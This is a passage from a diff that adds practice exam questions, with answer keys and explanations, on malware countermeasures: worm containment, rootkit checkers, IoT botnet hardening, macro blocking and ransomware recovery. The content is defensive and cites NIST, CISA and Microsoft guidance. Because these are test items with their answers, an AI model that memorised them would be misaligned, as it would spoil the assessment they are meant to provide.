+    "explanation": "Rebuild when an attacker had admin access, system files were replaced, the host is unstable, or the extent of the infection is in doubt.",
+    "optionNotes": [
+      "The antivirus cannot vouch for binaries that a rootkit altered.",
+      "Correct: replaced system files are one of SP 800-83's rebuild criteria.",
+      "Rescanning with the same tool repeats the same blind spot.",
+      "Passwords do not restore the replaced binaries."
+    ],
+    "tags": ["eradication", "rootkit"],
+    "sources": ["https://csrc.nist.gov/pubs/sp/800/83/r1/final", "https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-83r1.pdf"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0074",
+    "module": 7,
+    "section": "Malware Countermeasures",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "scenario",
+    "difficulty": 2,
+    "stem": "A worm is spreading between internal subnets through SMB, and the patch cannot be deployed for two days. What is the BEST immediate containment step?",
+    "options": [
+      "Wait for the patch before doing anything",
+      "Turn off all antivirus to speed up the network",
+      "Block TCP 445 between network segments and isolate infected hosts",
+      "Ask users to restart their computers"
+    ],
+    "answer": 2,
+    "explanation": "SP 800-83 lists disabling services and connectivity as containment methods; blocking the exploited port buys time to patch.",
+    "optionNotes": [
+      "Waiting lets it infect more hosts.",
+      "Removing protection helps the worm.",
+      "Correct: cutting the propagation path contains the worm until patching.",
+      "Restarting does not stop network spread."
+    ],
+    "tags": ["worm", "containment"],
+    "sources": [
+      "https://csrc.nist.gov/pubs/sp/800/83/r1/final",
+      "https://www.cisa.gov/news-events/alerts/2017/05/12/indicators-associated-wannacry-ransomware"
+    ],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0075",
+    "module": 7,
+    "section": "Malware Countermeasures",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "recall",
+    "difficulty": 2,
+    "stem": "According to NIST SP 800-83, what are the two main goals of malware containment?",
+    "options": [
+      "Identify the attacker and notify law enforcement",
+      "Stop the malware from spreading and prevent further damage to hosts",
+      "Restore data and reopen the service",
+      "Update signatures and patch all systems"
+    ],
+    "answer": 1,
+    "explanation": "Containment comes before eradication and recovery; it can mean isolating hosts, disabling services or blocking connectivity.",
+    "optionNotes": [
+      "Attribution is not containment.",
+      "Correct: halt spread, limit damage.",
+      "Restoring is recovery.",
+      "Patching and signatures belong to prevention and eradication."
+    ],
+    "tags": ["containment", "incident-response"],
+    "sources": ["https://csrc.nist.gov/pubs/sp/800/83/r1/final", "https://csrc.nist.gov/pubs/sp/800/61/r2/final"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0076",
+    "module": 7,
+    "section": "Malware Countermeasures",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "scenario",
+    "difficulty": 1,
+    "stem": "A small business owner wants to keep home-office IP cameras out of botnets like Mirai. What is the MOST important step?",
+    "options": [
+      "Change the default passwords and disable Telnet",
+      "Put the cameras in a different room",
+      "Buy cameras with higher resolution",
+      "Turn the cameras off at night"
+    ],
+    "answer": 0,
+    "explanation": "IoT botnets depend on default credentials and exposed management services; changing them removes the easy way in.",
+    "optionNotes": [
+      "Correct: Mirai logged in with default credentials over Telnet.",
+      "Physical location does not change network exposure.",
+      "Resolution is irrelevant to security.",
+      "Part-time power-off leaves the same weakness."
+    ],
+    "tags": ["botnet", "iot"],
+    "sources": [
+      "https://www.cisa.gov/news-events/alerts/2016/10/14/heightened-ddos-threat-posed-mirai-and-other-botnets",
+      "https://csrc.nist.gov/glossary/term/botnet"
+    ],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0077",
+    "module": 7,
+    "section": "Malware Countermeasures",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "tool",
+    "difficulty": 1,
+    "stem": "Which tool checks a Linux system for signs of known rootkits, such as modified system binaries?",
+    "options": ["Sigcheck", "Process Explorer", "AppLocker", "chkrootkit"],
+    "answer": 3,
+    "explanation": "chkrootkit and rkhunter are the classic Linux rootkit checkers; running them from trusted media gives more reliable results.",
+    "optionNotes": [
+      "Sigcheck checks Windows file signatures.",
+      "Process Explorer is a Windows process viewer.",
+      "AppLocker is Windows application control.",
+      "Correct: a shell script plus helpers that look for rootkit traces."
+    ],
+    "tags": ["rootkit", "tools"],
+    "sources": ["https://www.chkrootkit.org/", "https://rkhunter.sourceforge.net/"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0078",
+    "module": 7,
+    "section": "Malware Countermeasures",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "recall",
+    "difficulty": 1,
+    "stem": "Why must antivirus signatures be updated frequently?",
+    "options": [
+      "Updates remove the need for backups",
+      "Old signatures slow the network",
+      "Signature scanning can only detect malware whose pattern is already in the database",
+      "Signatures expire legally after a week"
+    ],
+    "answer": 2,
+    "explanation": "SP 800-83 stresses that antivirus is only effective when its signatures are fully up to date.",
+    "optionNotes": [
+      "Backups are still required.",
+      "Signature age does not affect network speed.",
+      "Correct: new malware needs new signatures.",
+      "There is no legal expiry."
+    ],
+    "tags": ["antivirus"],
+    "sources": ["https://csrc.nist.gov/glossary/term/antivirus_software", "https://csrc.nist.gov/pubs/sp/800/83/r1/final"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0079",
+    "module": 7,
+    "section": "Malware Countermeasures",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "scenario",
+    "difficulty": 1,
+    "stem": "Users keep receiving Word documents from the internet that ask them to \"Enable Content\". Which default Microsoft 365 behavior helps MOST here?",
+    "options": [
+      "Files are saved to OneDrive automatically",
+      "Documents open in full-screen mode",
+      "Spell checking runs on all documents",
+      "Macros in files from the internet are blocked by default"
+    ],
+    "answer": 3,
+    "explanation": "Blocking internet macros removes one of the most common malware delivery paths.",
+    "optionNotes": [
+      "Autosave does not stop macros.",
+      "Display mode has no security effect.",
+      "Spell checking is not a security control.",
+      "Correct: files marked with the Mark of the Web cannot run macros by default."
+    ],
+    "tags": ["macro", "phishing"],
+    "sources": [
+      "https://learn.microsoft.com/en-us/deployoffice/security/internet-macros-blocked",
+      "https://learn.microsoft.com/en-us/defender-endpoint/malware/macro-malware"
+    ],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0080",
+    "module": 7,
+    "section": "Malware Countermeasures",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "recall",
+    "difficulty": 2,
+    "stem": "What does Microsoft Defender's controlled folder access do?",
+    "options": [
+      "Encrypts all folders with BitLocker",
+      "Allows only trusted applications to change files in protected folders",
+      "Hides folders from the file explorer",
+      "Backs up folders to the cloud every hour"
+    ],
+    "answer": 1,
+    "explanation": "Controlled folder access is an anti-ransomware control, but it does not replace offline backups.",
+    "optionNotes": [
+      "BitLocker is a separate disk encryption feature.",
+      "Correct: it blocks unknown programs, such as ransomware, from modifying protected folders.",
+      "Hiding folders is not a security control.",
+      "It is not a backup feature."
+    ],
+    "tags": ["ransomware", "countermeasures"],
+    "sources": ["https://learn.microsoft.com/en-us/defender-endpoint/controlled-folders", "https://attack.mitre.org/techniques/T1486/"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0081",
+    "module": 7,
+    "section": "Malware Countermeasures",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "scenario",
+    "difficulty": 3,
+    "stem": "After a ransomware attack, the team is ready to restore servers from last week's backup. According to CISA's guidance, what should it check FIRST?",
+    "options": [
+      "That the backups and images do not contain the attacker's dropper or other persistence",
+      "That the ransom note has been printed for the insurer",
+      "That the backup is the most compressed version",
+      "That the encrypted files have been deleted"
+    ],
+    "answer": 0,
+    "explanation": "CISA warns that actors often leave droppers behind; confirm clean backups and golden images before rebuilding.",
+    "optionNotes": [
+      "Correct: restoring an infected image brings the attacker back.",
+      "Documentation matters, but it does not protect the restore.",
+      "Compression is irrelevant.",
+      "Encrypted files may be needed as evidence or for later decryption."
+    ],
+    "tags": ["ransomware", "recovery"],
+    "sources": ["https://www.cisa.gov/stopransomware/ransomware-guide", "https://csrc.nist.gov/pubs/sp/800/83/r1/final"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0082",
+    "module": 7,
+    "section": "Malware Countermeasures",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "tool",
+    "difficulty": 2,
+    "stem": "Which open-source tool builds a database of file attributes and hashes, then reports when system files change?",
+    "options": ["x64dbg", "INetSim", "AIDE", "Wireshark"],
+    "answer": 2,
+    "explanation": "File integrity monitoring detects Trojans or rootkits that replace system files, even when no signature exists.",
+    "optionNotes": [
+      "x64dbg is a debugger.",
+      "INetSim simulates internet services.",
+      "Correct: a file and directory integrity checker.",
+      "Wireshark captures network traffic."
+    ],
+    "tags": ["integrity", "tools"],
+    "sources": ["https://aide.github.io/", "https://csrc.nist.gov/pubs/sp/800/83/r1/final"],
+    "verify": false,
+    "rev": 1
+  }
+]
